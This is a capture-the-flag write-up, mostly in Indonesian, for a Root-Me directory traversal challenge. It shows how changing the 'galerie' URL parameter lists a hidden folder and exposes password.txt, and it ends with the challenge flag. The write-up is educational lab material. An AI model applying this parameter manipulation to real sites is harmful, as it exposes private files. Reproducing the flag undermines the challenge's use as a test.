@@ -1,0 +1,58 @@
+https://www.root-me.org/en/Challenges/Web-Server/Directory-traversal
+
+Directory traversal
+
+[Soal]
+
+Find the hidden section of the photo galery.
+
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php
+
+[POC]
+Buka url http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes
+
+Ubah menjadi http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./
+
+view-source:http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./
+<html>
+      <body>
+	  <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+	  
+	  <h1>Photo gallery v 0.01</h1>
+	  <span id="mnenu"/>&nbsp;|&nbsp;<span>
+	  <a href="?galerie=emotes">emotes</a></span>&nbsp;|&nbsp;<span><a href="?galerie=apps">apps</a>
+	  </span>&nbsp;|&nbsp;<span>
+	  <a href="?galerie=devices">devices</a></span>&nbsp;|&nbsp;<span>
+	  <a href="?galerie=categories">categories</a></span>&nbsp;|&nbsp;<span>
+	  <a href="?galerie=actions">actions</a></span>&nbsp;|</span><span style='text-align: right; float:right;'>Connected as : <b>guest</b></span><br/><hr/>
+	  <table id="content"><tr>
+	  <td><img width="64px" height="64px" src="galerie/.//86hwnX2r" alt="86hwnX2r"></td></tr><tr>
+	  <td><img width="64px" height="64px" src="galerie/.//emotes" alt="emotes"></td>
+	  <td><img width="64px" height="64px" src="galerie/.//apps" alt="apps"></td>
+	  <td><img width="64px" height="64px" src="galerie/.//devices" alt="devices"></td></tr><tr>
+	  <td><img width="64px" height="64px" src="galerie/.//categories" alt="categories"></td>
+	  <td><img width="64px" height="64px" src="galerie/.//actions" alt="actions"></td></tr></table></body></html>
+	  
+Perhatikan src="galerie/.//86hwnX2r" alt="86hwnX2r"
+
+Akses kembali url dengan menambahkan 86hwnX2r 
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r
+
+view-source:http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r
+
+<html>
+      <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+	  <h1>Photo gallery v 0.01</h1><span id="mnenu"/>&nbsp;|&nbsp;<span>
+	  <a href="?galerie=emotes">emotes</a></span>&nbsp;|&nbsp;<span><a href="?galerie=apps">apps</a></span>&nbsp;|&nbsp;<span>
+	  <a href="?galerie=devices">devices</a></span>&nbsp;|&nbsp;<span><a href="?galerie=categories">categories</a></span>&nbsp;|&nbsp;<span>
+	  <a href="?galerie=actions">actions</a></span>&nbsp;|</span>
+	  <span style='text-align: right; float:right;'>Connected as : <b>guest</b></span><br/><hr/><table id="content"><tr></tr><tr>
+	  <td><img width="64px" height="64px" src="galerie/86hwnX2r/password.txt" alt="password.txt"></td>
+	  <td><img width="64px" height="64px" src="galerie/86hwnX2r/hacked_web.jpg" alt="hacked_web.jpg"></td>
+	  <td><img width="64px" height="64px" src="galerie/86hwnX2r/secret.png" alt="secret.png"></td></tr><tr></tr></table></body></html>
+	  
+Perhatikan galerie/86hwnX2r/password.txt
+
+view image location : http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt
+
+#Flag = kcb$!Bx@v4Gs9Ez
